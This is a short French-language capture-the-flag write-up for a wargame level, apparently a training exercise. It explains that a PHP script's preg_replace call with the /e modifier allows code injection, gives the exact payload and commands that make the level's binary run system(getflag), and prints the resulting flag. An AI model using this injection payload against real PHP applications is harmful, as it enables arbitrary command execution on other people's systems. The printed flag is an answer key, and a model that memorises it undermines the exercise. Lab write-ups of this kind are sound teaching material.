Bonjour, Nous sommes actuellement au Level06.
Prenez le temps de lire et de poser des questions, nous sommes la pour ca.

On remarque les 2 fichiers level06 et level06.php, level06 representant la version compilé de level06.php (le lancer donne le même
résultat que de lancer level06.php avec la commande "php level06.php"

Après quelques recherches on trouve rapidement que la fonction utilisée "preg_replace" est deprecated à cause de sa vulnérabilité,
principalement à cause de son flag "/e", qui est présent dans level06.php.

On trouve un exemple de "cracking" de la fonction preg_replace avec /e sur ce site: http://www.madirish.net/402

On apprend qu'il est assez simple d'injecter du code avec cette fonction, et on injecte donc la fonction "system(getflag)".

- echo '[x {${@system(getflag)}}]' > /tmp/crack
- chmod 777 /tmp/crack
- ./level06 /tmp/crack

L'injection fonctionne et nous écrit le flag: wiok45aaoguiboiki2tuin6ub
